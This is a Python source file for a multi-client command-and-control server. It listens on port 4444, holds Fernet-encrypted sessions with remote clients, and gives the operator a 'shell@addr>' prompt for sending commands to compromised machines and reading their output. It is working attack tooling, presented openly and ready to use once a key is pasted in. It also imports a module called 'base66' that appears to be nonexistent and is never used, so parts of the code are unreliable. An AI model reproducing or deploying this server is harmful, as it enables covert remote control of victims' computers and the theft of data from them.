import socket
import threading
import sys
import os
import struct # For packing and unpacking the data length
from cryptography.fernet import Fernet
from base66 import encode # A simple base64-like encoding

# --- Configuration ---
HOST = '0.0.0.0'
PORT = 4444
BUFFER_SIZE = 4096
# PASTE YOUR GENERATED KEY HERE IN BYTES FORMAT (b'...')
ENCRYPTION_KEY = b'PASTE_YOUR_GENERATED_KEY_HERE_AS_BYTES' 

# Initialize the Fernet cipher with the key
cipher_suite = Fernet(ENCRYPTION_KEY)

# Dictionary to store connected clients: {address: connection_object}
clients = {}
client_count = 0
client_lock = threading.Lock()

def send_encrypted(conn, data):
    """Encrypts and sends data with a length prefix."""
    try:
        encrypted_data = cipher_suite.encrypt(data.encode('utf-8'))
        # Pack the length of the encrypted data into a 4-byte integer (struct.pack)
        conn.sendall(struct.pack('>I', len(encrypted_data)) + encrypted_data)
        return True
    except (socket.error, BrokenPipeError):
        return False

def recv_encrypted(conn):
    """Receives data with a length prefix, then decrypts it."""
    try:
        # First, receive the 4-byte length prefix
        raw_len = conn.recv(4)
        if not raw_len: return None
        
        # Unpack the length from the bytes
        data_len = struct.unpack('>I', raw_len)[0]
        
        # Now, receive the actual data in chunks until we have it all
        data_chunks = []
        bytes_recd = 0
        while bytes_recd < data_len:
            chunk = conn.recv(min(data_len - bytes_recd, BUFFER_SIZE))
            if not chunk: return None # Connection closed
            data_chunks.append(chunk)
            bytes_recd += len(chunk)
            
        encrypted_data = b''.join(data_chunks)
        
        # Decrypt the received data
        decrypted_data = cipher_suite.decrypt(encrypted_data).decode('utf-8')
        return decrypted_data
        
    except (socket.error, ConnectionResetError, struct.error, Exception):
        return None # Return None on any error to indicate connection loss

def handle_client(conn, addr):
    """Handles communication with a single client."""
    global client_count
    
    print(f"[+] Encrypted connection from {addr} has been established.")
    
    with client_lock:
        clients[addr] = conn
        client_count += 1
        client_id = client_count
        print(f"[*] Client {client_id} ({addr}) connected. Total clients: {client_count}")
    
    # Main loop for receiving data from the client (e.g., command output)
    while True:
        output = recv_encrypted(conn)
        if output is None:
            break # Connection lost or closed
        
        print(f"\n[Output from {addr}]:\n{output}")

    # Clean up and remove the client from the dictionary
    print(f"[-] Connection with {addr} closed.")
    with client_lock:
        if addr in clients:
            del clients[addr]
            print(f"[*] Client {addr} removed. Total clients: {len(clients)}")
    conn.close()

def main_loop():
    """Main C2 server interaction loop."""
    while True:
        command = input("C2> ").strip()
        
        if command.lower() == 'list':
            with client_lock:
                if not clients:
                    print("[*] No clients connected.")
                else:
                    print("[*] Connected clients:")
                    for i, addr in enumerate(clients.keys()):
                        print(f"  [{i}] {addr}")
        
        elif command.lower().startswith('interact '):
            try:
                client_id = int(command.split(' ')[1])
                with client_lock:
                    if client_id < len(clients):
                        target_addr = list(clients.keys())[client_id]
                        interact_with_client(clients[target_addr], target_addr)
                    else:
                        print(f"[-] Invalid client ID: {client_id}")
            except (ValueError, IndexError):
                print("[-] Usage: interact <client_id>")
        
        elif command.lower() == 'exit':
            print("[*] Shutting down server...")
            with client_lock:
                for conn in clients.values():
                    conn.close()
            # This will cause the server.accept() to raise an exception,
            # which will be caught in the start_server function.
            os._exit(0) # Force exit all threads
            
        else:
            print("[-] Unknown command. Available commands: list, interact <id>, exit")
            
def interact_with_client(conn, addr):
    """Allows sending commands to a single client."""
    print(f"\n[*] Interacting with {addr}. Type 'back' to return to the main menu.")
    
    # We don't send an initial command anymore; we just enter the loop
    while True:
        command = input(f"shell@{addr}> ").strip()
        
        if command.lower() == 'back':
            print(f"[*] Returning to main C2 menu.")
            break
        
        if not command:
            continue
            
        # Send the command to the client with encryption
        if not send_encrypted(conn, command):
            print(f"[-] Connection to {addr} lost. Exiting interaction mode.")
            break

def start_server():
    """Initializes and starts the server listener."""
    server_socket = None
    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((HOST, PORT))
        server_socket.listen(5)
        print(f"[*] C2 server listening on {HOST}:{PORT}")
        
        # Start a thread for user interaction
        interaction_thread = threading.Thread(target=main_loop)
        interaction_thread.daemon = True 
        interaction_thread.start()
        
        while True:
            conn, addr = server_socket.accept()
            client_handler_thread = threading.Thread(target=handle_client, args=(conn, addr))
            client_handler_thread.daemon = True
            client_handler_thread.start()
            
    except socket.error as e:
        print(f"[-] Socket error: {e}")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[*] Ctrl+C detected. Shutting down...")
    finally:
        if server_socket:
            server_socket.close()
        print("[*] Server has been shut down.")

if __name__ == "__main__":
    os.system('cls' if os.name == 'nt' else 'clear') 
    start_server()
